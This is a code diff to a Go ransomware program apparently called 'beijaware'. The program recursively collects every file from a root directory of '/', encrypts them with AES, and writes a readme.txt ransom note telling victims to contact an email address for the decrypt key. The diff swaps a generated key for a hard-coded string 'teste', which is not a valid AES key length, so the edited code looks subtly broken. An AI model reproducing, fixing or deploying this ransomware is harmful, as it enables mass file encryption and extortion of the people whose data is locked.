@@ -4,7 +4,6 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"encoding/hex"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -13,7 +12,6 @@ import (
 	"sync"
 
 	"github.com/dalbonip/beijaware/explorer"
-	"github.com/dalbonip/beijaware/keygen"
 )
 
 var Dir string = "/" // Insert starting directory
@@ -21,15 +19,15 @@ var wg sync.WaitGroup
 
 func main() {
 	Encrypted := make(chan []byte, 100)
-	cryptoKey := keygen.Keygen()
+	//cryptoKey := "teste" //keygen.Keygen()
 	contact := "" // Insert contact email
-	fmt.Println("THIS IS THE KEY:", cryptoKey)
+	//fmt.Println("THIS IS THE KEY:", cryptoKey)
 
-	key, err := hex.DecodeString(cryptoKey)
-	if err != nil {
-		panic(err)
-	}
-
+	//key, err := hex.DecodeString(cryptoKey)
+	//if err != nil {
+	//	panic(err)
+	//}
+	key := []byte("teste")
 	//use function mapfiles from explorer (gets every file recursive by decided dir except decrypter!)
 	files := explorer.MapFiles(Dir)
 
@@ -61,7 +59,7 @@ func main() {
 	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypter/ decrypt key."
 	fmt.Println(msg)
 
-	err = ioutil.WriteFile(root+"/readme.txt", []byte(msg), 0644)
+	err := ioutil.WriteFile(root+"/readme.txt", []byte(msg), 0644)
 	if err != nil {
 		panic(err)
 	}
